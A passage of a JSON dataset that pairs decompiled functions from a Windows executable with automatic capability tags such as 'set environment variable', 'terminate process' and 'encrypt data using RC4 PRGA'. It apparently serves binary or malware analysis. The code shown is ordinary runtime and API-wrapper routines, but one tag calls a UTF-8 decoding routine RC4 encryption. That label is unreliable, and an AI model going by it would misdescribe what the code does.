CONCAT112(-(pcVar7[0xc] == cVar13), \n                                                             CONCAT111(-(pcVar7[0xb] == cVar12), \n                                                                       CONCAT110(-(pcVar7[10] == cVar11), \n                                                                                 CONCAT19(-(pcVar7[9] == cVar10), \n                                                                                          CONCAT18(-(pcVar7[8] == cVar2)\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == cVar16), \n                                                            CONCAT16(-(pcVar7[6] == cVar15), \n                                                                     CONCAT15(-(pcVar7[5] == cVar14), \n                                                                              CONCAT14(-(pcVar7[4] == cVar13), \n                                                                                       CONCAT13(-(pcVar7[3] == cVar12), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          cVar11), \n                                                                                                         CONCAT11(-(\n                                                            pcVar7[1] == cVar10), -(*pcVar7 == cVar2))))))))))))))));\n            uVar3 = (SUB161(auVar8 >> 7, 0) & 1 | (SUB161(auVar8 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar8 >> 0x17, 0) & 1) << 2 | (SUB161(auVar8 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar8 >> 0x27, 0) & 1) << 4 | (SUB161(auVar8 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar8 >> 0x37, 0) & 1) << 6 | (SUB161(auVar8 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar8 >> 0x47, 0) & 1) << 8 | (SUB161(auVar8 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar8 >> 0x57, 0) & 1) << 10 | (SUB161(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar8 >> 0x77, 0) & 1) << 0xe | SUB161(auVar8 >> 0x7f, 0) << 0xf) & uVar3;\n            if (uVar3 != 0) break;\n            uVar3 = 0xffffffff;\n            pcVar7 = pcVar7 + 0x10;\n        }\n        iVar1 = 0;\n        if (uVar3 != 0) {\n            for (; (uVar3 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n            }\n        }\n        puVar4 = pcVar7 + iVar1;\n        if (cVar2 != *puVar4) {\n            puVar4 = NULL;\n        }\n        return puVar4;\n    }\n    uVar3 = param_1 & 3;\n    while (uVar3 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar3 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar3 = *param_1;\n            uVar6 = uVar3 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar5 = uVar3 ^ 0xffffffff ^ uVar3 + 0x7efefeff;\n            puVar4 = param_1 + 1;\n            if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar4;\n            if ((uVar5 & 0x81010100) != 0) {\n                if ((uVar5 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar3 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar3 = *param_1;\n        if (uVar3 == param_2) {\n            return param_1;\n        }\n        if (uVar3 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar3 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar4;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1966
    },
    "004c9a31": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t * fcn.004c9a31(uint16_t *param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    uchar auVar2 [16];\n    uchar auVar3 [16];\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iStack52;\n    \n    if (0 < *0x573c4c) {\n        auVar2 = pshuflw(ZEXT216(param_2), ZEXT216(param_2), 0);\n        do {\n            if ((param_1 & 0xfff) < 0xff1) {\n                uVar4 = SUB162(auVar2, 0);\n                uVar5 = SUB162(auVar2 >> 0x10, 0);\n                auVar3 = CONCAT214(-(param_1[7] == 0), \n                                   CONCAT212(-(param_1[6] == 0), \n                                             CONCAT210(-(param_1[5] == 0), \n                                                       CONCAT28(-(param_1[4] == 0), \n                                                                CONCAT26(-(param_1[3] == 0), \n                                                                         CONCAT24(-(param_1[2] == 0), \n                                                                                  CONCAT22(-(param_1[1] == 0), \n                                                                                           -(*param_1 == 0)))))))) |\n                         CONCAT214(-(param_1[7] == uVar5), \n                                   CONCAT212(-(param_1[6] == uVar4), \n                                             CONCAT210(-(param_1[5] == uVar5), \n                                                       CONCAT28(-(param_1[4] == uVar4), \n                                                                CONCAT26(-(param_1[3] == uVar5), \n                                                                         CONCAT24(-(param_1[2] == uVar4), \n                                                                                  CONCAT22(-(param_1[1] == uVar5), \n                                                                                           -(*param_1 == uVar4))))))));\n                uVar4 = SUB161(auVar3 >> 7, 0) & 1 | (SUB161(auVar3 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar3 >> 0x17, 0) & 1) << 2 | (SUB161(auVar3 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar3 >> 0x27, 0) & 1) << 4 | (SUB161(auVar3 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar3 >> 0x37, 0) & 1) << 6 | (SUB161(auVar3 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar3 >> 0x47, 0) & 1) << 8 | (SUB161(auVar3 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar3 >> 0x57, 0) & 1) << 10 | (SUB161(auVar3 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar3 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar3 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar3 >> 0x77, 0) & 1) << 0xe | SUB161(auVar3 >> 0x7f, 0) << 0xf;\n                if (uVar4 != 0) goto code_r0x004e3202;\n                iStack52 = 0x10;\n            }\n            else {\n                if (*param_1 == param_2) {\n                    return param_1;\n                }\n                if (*param_1 == 0) {\n                    return NULL;\n                }\n                iStack52 = 2;\n            }\n            param_1 = param_1 + iStack52;\n        } while( true );\n    }\n    uVar4 = *param_1;\n    while ((uVar4 != 0 && (uVar4 != param_2))) {\n        param_1 = param_1 + 1;\n        uVar4 = *param_1;\n    }\ncode_r0x004e31a4:\n    return (uVar4 != param_2) - 1 & param_1;\ncode_r0x004e3202:\n    iVar1 = 0;\n    if (uVar4 != 0) {\n        for (; (uVar4 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    param_1 = param_1 + iVar1;\n    uVar4 = *param_1;\n    goto code_r0x004e31a4;\n}\n",
        "token_count": 1096
    },
    "004e1022": {
        "rules": [
            "contain loop",
            "encrypt data using RC4 PRGA"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004e1022(uint32_t param_1, uint8_t *param_2, uint32_t param_3, uint32_t *param_4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar4;\n    uint32_t uVar3;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    char cStack23;\n    uint8_t uStack22;\n    char cStack21;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    if (param_4 == NULL) {\n        param_4 = 0x57570c;\n    }\n    puVar6 = param_2;\n    if (param_2 == NULL) {\n        param_3 = 1;\n        puVar6 = 0x552647;\n    }\n    puVar7 = -(param_2 != NULL) & param_1;\n    if (param_3 == 0) goto code_r0x004e0faa;\n    if (*(param_4 + 6) == 0) {\n        uStack22 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if (-1 < uStack22) {\n            if (puVar7 != NULL) {\n                *puVar7 = uStack22;\n            }\n            goto code_r0x004e0faa;\n        }\n        if ((uStack22 & 0xe0) == 0xc0) {\n            cStack21 = '\\x02';\n        }\n        else if ((uStack22 & 0xf0) == 0xe0) {\n            cStack21 = '\\x03';\n        }\n        else {\n            if ((uStack22 & 0xf8) != 0xf0) goto code_r0x004e0fa3;\n            cStack21 = '\\x04';\n        }\n        cStack23 = cStack21;\n        uVar3 = CONCAT11(cStack21, cStack21);\n        uVar5 = (1 << (7U - cStack21 & 0x1f)) - 1U & uStack22;\ncode_r0x004e0ef7:\n        uVar2 = uVar3 >> 8;\n        uStack32 = param_3;\n        if (uVar2 < param_3) {\n            uStack32 = uVar2;\n        }\n        uStack28 = puVar6 - param_2;\n        while (uStack28 < uStack32) {\n            uVar1 = *puVar6;\n            puVar6 = puVar6 + 1;\n            uStack28 = uStack28 + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x004e0fa3;\n            uVar5 = uVar5 << 6 | uVar1 & 0x3f;\n        }\n        if (uStack32 < uVar2) {\n            *(param_4 + 1) = uVar3;\n            *param_4 = uVar5;\n            *(param_4 + 6) = (uVar3 >> 8) - uStack32;\n            goto code_r0x004e0faa;\n        }\n        if (((uVar5 < 0xd800) || (0xdfff < uVar5)) && (uVar5 < 0x110000)) {\n            uStack20 = 0x80;\n            uStack16 = 0x800;\n            uStack12 = 0x10000;\n            if ((&uStack28)[uVar3 & 0xff] <= uVar5) {\n                if (puVar7 != NULL) {\n                    *puVar7 = uVar5;\n                }\n                *param_4 = 0;\n                param_4[1] = 0;\n                goto code_r0x004e0faa;\n            }\n        }\n    }\n    else {\n        uVar1 = *(param_4 + 1);\n        uVar5 = *param_4;\n        uVar3 = CONCAT11(*(param_4 + 6), uVar1);\n        if (((uVar1 - 2 < 3) && (uVar4 = uVar3 >> 8,  uVar4 != 0)) && (uVar4 < uVar1)) goto code_r0x004e0ef7;\n    }\ncode_r0x004e0fa3:\n    fcn.00402617(param_4);\ncode_r0x004e0faa:\n    fcn.004030bc(param_2);\n    return;\n}\n",
        "token_count": 1068
    },
    "004cbd43": {
        "rules": [
            "print debug messages"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004cbd43(uint *arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(*arg_8h);\n    return;\n}\n",
        "token_count": 41
    },
    "004c987e": {
        "rules": [
            "set environment variable"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c987e(uint *arg_8h, uint *arg_ch)\n\n{\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(*arg_8h, *arg_ch);\n    return;\n}\n",
        "token_count": 51
    },
    "00406802": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406802(uint ExceptionInfo)\n\n{\n    uint uVar1;\n    \n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 100
    },
    "00404809": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404809(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004c9f0f();\n    if (pcVar1 == NULL) {\n        uVar2 = fcn.00403c5b(arg_8h, 0);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(uVar2);\n    }\n    else {\n        (**0x578000)(arg_8h, arg_ch, arg_10h, arg_14h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 153
    }
}